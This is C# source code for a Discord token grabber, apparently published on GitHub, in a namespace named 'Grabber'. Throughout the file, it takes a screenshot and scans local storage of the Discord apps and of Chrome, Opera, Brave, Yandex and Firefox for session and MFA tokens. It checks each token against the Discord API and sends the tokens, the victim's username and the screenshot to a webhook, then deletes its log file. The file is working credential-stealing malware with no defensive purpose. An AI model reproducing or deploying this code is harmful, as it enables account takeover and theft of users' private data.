
/*
  Class made by Misakiii
  https://github.com/Miisaakii
  Don't use it for annoying people
*/


#region "Library"

using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

#endregion

namespace Grabber
{
	#region "TestTokens Class"

	public class TestTokens
	{
		public static string Hook = "WEBHOOK_URL";

		private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";

		private static bool App = false;
		private static bool Canary = false;
		private static bool PTB = false;
		private static bool Chrome = false;
		private static bool Opera = false;
		private static bool Brave = false;
		private static bool Yandex = false;
		private static bool OperaGX = false;
		private static bool Lightcord = false;

		private static bool Firefox = false;
		private static bool StealFound;
		private static bool StealFirefoxFound;

		//used a another webhook more simple
		public static void SendWebHook(string token, string name, string picture, string message, string file)
		{
			Webhook hook = new Webhook(token);
			hook.Name = name;
			hook.ProfilePictureUrl = picture;

			hook.SendMessage(message, file);
		}

		private static List<string> TokenTestTokens(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.ldb");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}"))
					{
						TestTokens.SaveTokens(TestTokens.TokenCheckAcces(((Match)obj).Value));
					}
					foreach (object obj2 in Regex.Matches(input, @"mfa\.[a-zA-Z0-9_\-]{84}"))
					{
						TestTokens.SaveTokens(TestTokens.TokenCheckAcces(((Match)obj2).Value));
					}
				}
			}
			catch
			{

			}

			list = list.Distinct<string>().ToList<string>();
			if (list.Count > 0)
			{
				TestTokens.StealFound = true;
				List<string> list2 = list;
				int index = list.Count - 1;
				list2[index] = (list2[index] ?? "");
			}
			TestTokens.Firefox = false;
			TestTokens.Opera = false;
			TestTokens.Chrome = false;
			TestTokens.App = false;
			TestTokens.PTB = false;
			TestTokens.Brave = false;
			TestTokens.Yandex = false;
			TestTokens.Canary = false;
			TestTokens.OperaGX = false;
			TestTokens.Lightcord = false;

			return list;
		}

		private static string SaveTokens(string token)
		{
			if (!(token == ""))
			{
				string text;
				if (TestTokens.Chrome)
				{
					text = "Chrome";
				}
				else if (TestTokens.Opera)
				{
					text = "Opera";
				}
				else if (TestTokens.App)
				{
					text = "Discord App";
				}
				else if (TestTokens.Canary)
				{
					text = "Discord Canary";
				}
				else if (TestTokens.PTB)
				{
					text = "Discord PTB";
				}
				else if (TestTokens.Brave)
				{
					text = "Brave";
				}
				else if (TestTokens.Yandex)
				{
					text = "Yandex";
				}
				else if (TestTokens.OperaGX)
				{
					text = "Opera GX";
				}
				else if (TestTokens.Lightcord)
				{
					text = "Lightcord";
				}
				else
				{
					text = "Unknown";
				}
				text = text + " Token Found :: " + token + "\n";
				File.AppendAllText(TestTokens._path, text);
				TestTokens.RemoveDuplicatedLines(TestTokens._path);
			}
			return token;
		}

		private static void RemoveDuplicatedLines(string path)
		{
			List<string> list = new List<string>();
			StringReader stringReader = new StringReader(File.ReadAllText(path));
			string item;
			while ((item = stringReader.ReadLine()) != null)
			{
				if (!list.Contains(item))
				{
					list.Add(item);
				}
			}
			stringReader.Close();
			StreamWriter streamWriter = new StreamWriter(File.Open(path, FileMode.Open));
			foreach (string value in list)
			{
				streamWriter.WriteLine(value);
			}
			streamWriter.Flush();
			streamWriter.Close();
		}

		private static string TokenCheckAcces(string token)
		{
			using (WebClient webClient = new WebClient())
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection[""] = "";
				webClient.Headers.Add("Authorization", token);
				try
				{
					webClient.UploadValues("https://discordapp.com/api/v9/invite/kokoro", nameValueCollection);
				}
				catch (WebException ex)
				{
					string text = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
					if (text.Contains("401: Unauthorized"))
					{
						token = "";
					}
					else if (text.Contains("You need to verify your account in order to perform this action."))
					{
						token = "";
					}
				}
			}
			return token;
		}

		public static void StartSteal()
		{
			try
			{
				Bitmap bit = new Bitmap(1920, 1080);
				Graphics g = Graphics.FromImage(bit);
				g.CopyFromScreen(new Point(30, 30), new Point(0, 0), bit.Size);
				g.Dispose();
				bit.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Discord.jpeg");

				string file = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Discord.jpeg";

				SendWebHook(Hook, "Misaki Token Grab", "", "ScreenShot:", file);

				TestTokens.StealTokenFromChrome();
				TestTokens.StealTokenFromOpera();
				TestTokens.StealTokenFromOperaGX();
				TestTokens.StealTokenFromDiscordApp();
				TestTokens.StealTokenFromDiscordCanary();
				TestTokens.StealTokenFromDiscordPTB();
				TestTokens.StealTokenFromBraveBrowser();
				TestTokens.StealTokenFromYandexBrowser();
				TestTokens.StealTokenFromFirefox();
				TestTokens.StealTokenFromLightcord();

				TestTokens.Send(File.ReadAllText(TestTokens._path));

				if (File.Exists(TestTokens._path))
				{
					File.Delete(TestTokens._path);
				}
			}
			catch (Exception)
			{

			}
		}

		private static void Send(string tokenReport)
		{
			try
			{
				HttpClient httpClient = new HttpClient();
				Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
				{
					{
						"content",
						string.Concat(new string[]
						{
							string.Join("\n", new string[]
							{
								"᲼᲼᲼᲼᲼᲼\n***New report from PC: " + Environment.UserName + "\n" + tokenReport + "\n```"
							}),
						})
					},
				};
				httpClient.PostAsync(Hook, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
			}
			catch
			{
			}
		}

		private static void StealTokenFromDiscordApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TestTokens.App = true;
				List<string> list = TestTokens.TokenTestTokens(folder, false);
				if (list != null && list.Count > 0)
				{
					TestTokens.App = true;
				}
			}
		}

		private static void StealTokenFromDiscordCanary()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TestTokens.Canary = true;
				List<string> list = TestTokens.TokenTestTokens(folder, false);
				if (list != null && list.Count > 0)
				{
					TestTokens.Canary = true;
				}
			}
		}

		private static void StealTokenFromDiscordPTB()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TestTokens.PTB = true;
				List<string> list = TestTokens.TokenTestTokens(folder, false);
				if (list != null && list.Count > 0)
				{
					TestTokens.PTB = true;
				}
			}
		}

		private static void StealTokenFromLightcord()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Lightcord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TestTokens.Lightcord = true;
				List<string> list = TestTokens.TokenTestTokens(folder, false);
				if (list != null && list.Count > 0)
				{
					TestTokens.Lightcord = true;
				}
			}
		}

		private static void StealTokenFromBraveBrowser()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TestTokens.Brave = true;
				List<string> list = TestTokens.TokenTestTokens(folder, false);
				if (list != null && list.Count > 0)
				{
					TestTokens.Brave = true;
				}
			}
		}

		private static void StealTokenFromYandexBrowser()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TestTokens.Yandex = true;
				List<string> list = TestTokens.TokenTestTokens(folder, false);
				if (list != null && list.Count > 0)
				{
					TestTokens.Yandex = true;
				}
			}
		}

		private static void StealTokenFromChrome()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TestTokens.Chrome = true;
				List<string> list = TestTokens.TokenTestTokens(folder, false);
				if (list != null && list.Count > 0)
				{
					TestTokens.Chrome = true;
				}
			}
		}

		private static void StealTokenFromOpera()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TestTokens.Opera = true;
				List<string> list = TestTokens.TokenTestTokens(folder, false);
				if (list != null && list.Count > 0)
				{
					TestTokens.Opera = true;
				}
			}
		}

		private static void StealTokenFromOperaGX()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				TestTokens.OperaGX = true;
				List<string> list = TestTokens.TokenTestTokens(folder, false);
				if (list != null && list.Count > 0)
				{
					TestTokens.OperaGX = true;
				}
			}
		}

		private static void StealTokenFromFirefox()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
			if (Directory.Exists(path))
			{
				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
				{
					List<string> list = TestTokens.TokenTestTokensForFirefox(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), false);
					if (list != null && list.Count > 0)
					{
						foreach (string str in (from t in list
												where !TestTokens.App
												select t).Select(new Func<string, string>(TestTokens.TokenCheckAcces)))
						{
							TestTokens.Firefox = true;
							File.AppendAllText(TestTokens._path, "Firefox Token: " + str + Environment.NewLine);
						}
					}
				}
			}
		}

		private static List<string> TokenTestTokensForFirefox(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.sqlite");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}"))
					{
						Match match = (Match)obj;
						list.Add(match.Value);
					}
					foreach (object obj2 in Regex.Matches(input, @"mfa\.[a-zA-Z0-9_\-]{84}"))
					{
						Match match2 = (Match)obj2;
						list.Add(match2.Value);
					}
				}
			}
			catch
			{
			}
			list = list.Distinct<string>().ToList<string>();
			if (list.Count > 0)
			{
				TestTokens.StealFirefoxFound = true;
				List<string> list2 = list;
				int index = list.Count - 1;
				list2[index] = (list2[index] ?? "");
			}
			TestTokens.Firefox = false;
			return list;
		}
	}

	#endregion

	#region "WebHook Class"

	class Webhook
	{
		private HttpClient Client;
		private string Url;

		public string Name { get; set; }
		public string ProfilePictureUrl { get; set; }

		public Webhook(string webhookUrl)
		{
			Client = new HttpClient();
			Url = webhookUrl;
		}

		public bool SendMessage(string content, string file = null)
		{
			MultipartFormDataContent data = new MultipartFormDataContent();
			data.Add(new StringContent(Name), "username");
			data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
			data.Add(new StringContent(content), "content");

			if (file != null)
			{
				if (!File.Exists(file))
					throw new FileNotFoundException();

				byte[] bytes = File.ReadAllBytes(file);

				data.Add(new ByteArrayContent(bytes), "file", "img.jpeg"); //change "file" to "file.(extention) if you wish to download as ext
			}

			var resp = Client.PostAsync(Url, data).Result;

			return resp.StatusCode == HttpStatusCode.NoContent;
		}
	}

	#endregion
}